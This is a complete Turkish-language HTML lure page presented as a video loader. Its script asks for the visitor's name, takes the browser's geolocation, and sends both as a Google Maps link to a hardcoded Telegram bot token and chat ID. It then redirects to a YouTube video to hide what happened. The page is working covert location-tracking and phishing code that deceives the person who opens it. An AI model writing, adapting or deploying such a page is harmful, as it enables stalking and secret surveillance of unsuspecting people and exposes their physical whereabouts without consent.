<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Video Başlatılıyor...</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding-top: 60px;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      width: 250px;
      font-size: 16px;
    }
    #durum {
      color: green;
      height: 1.5em;
    }
  </style>
</head>
<body>

  <h2>Giriş yapın</h2>
  <input id="isim" placeholder="Adınız">
  <br>
  <button onclick="devam()">Devam Et</button>
  <p id="durum"></p>

  <script>
    const BOT_TOKEN = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
    const CHAT_ID = "8499614707";
    const YOUTUBE_URL = "https://www.youtube.com/watch?v=PCMJtCjfxpw";

    function arkadaGonder(isim, konum) {
      const mesaj = `🧑 Ad: ${isim}\n📍 Konum: https://maps.google.com?q=${konum.lat},${konum.lon}`;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: mesaj })
      });
    }

    function devam() {
      const isim = document.getElementById("isim").value.trim();
      const durum = document.getElementById("durum");

      if (!isim) {
        durum.style.color = "red";
        durum.textContent = "Lütfen adınızı girin.";
        return;
      }

      navigator.geolocation.getCurrentPosition(pos => {
        const konum = {
          lat: pos.coords.latitude.toFixed(6),
          lon: pos.coords.longitude.toFixed(6)
        };

        arkadaGonder(isim, konum);
        durum.textContent = "Video başlatılıyor...";
        setTimeout(() => {
          window.location.href = YOUTUBE_URL;
        }, 1500);
      }, err => {
        durum.style.color = "red";
        durum.textContent = "Konum alınamadı: " + err.message;
      });
    }
  </script>

</body>
</html>
